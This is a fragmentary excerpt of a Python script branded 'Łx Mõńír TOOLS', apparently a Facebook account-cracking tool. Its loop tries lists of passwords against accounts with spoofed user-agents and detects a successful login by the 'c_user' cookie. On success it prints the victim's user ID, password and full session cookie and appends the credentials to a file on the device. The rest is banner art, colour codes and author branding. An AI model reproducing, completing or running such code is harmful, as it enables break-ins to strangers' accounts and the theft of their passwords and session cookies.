...
ha = current.day
today = date.today()
#Łx Mõńír2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mŁx Mõńír')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Łx Mõńír/1.2.0 OPN-B'
...
def banner():
    ...
    ____ _  __    __ __ _____   ________
   / __ \ |/ /   / //_//  _/ | / / ____/
  / / / /   /   / ,<   / //  |/ / / __  
 / /_/ /   |   / /| |_/ // /|  / /_/ /  
/_____/_/|_|  /_/ |_/___/_/ |_/\____/   
                                        
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO Łx Mõńír TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m FREE
\033[1;32m[-] AUTHOR    :\033[1;32m 𝐌𝐎𝐍𝐈𝐑 
\033[1;32m[-] GITHUB    :\033[1;32m MAFI VAU
\033[1;32m[-] FACEBOOK  :\033[1;32m Łx Mõńír
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS DX KING BRAND\033[;0m\033[1;91m═══>\033[1;92m{P}""")
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/pinikdada.vai.top.king.magibaj')
       main()  
        ...
        for ps in pwx:
           ...
           'user-agent': ff}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;92m[Łx Mõńír-OK🌻] '+uid+' | '+ps+'\033[0;97m')
                print(f'{B}[COOKIE🎁] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Łx Mõńír-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mŁx Mõńír","\x1b[1;92mŁx Mõńír","\x1b[1;93mŁx Mõńír","\x1b[1;94mŁx Mõńír","\x1b[1;95mŁx Mõńír","\x1b[1;96mŁx Mõńír","\x1b[1;97mŁx Mõńír","\x1b[1;91mŁx Mõńír","\x1b[1;92mŁx Mõńír","\x1b[1;93mŁx Mõńír","\x1b[1;94mŁx Mõńír","\x1b[1;95mŁx Mõńír","\x1b[1;96mŁx Mõńír"])
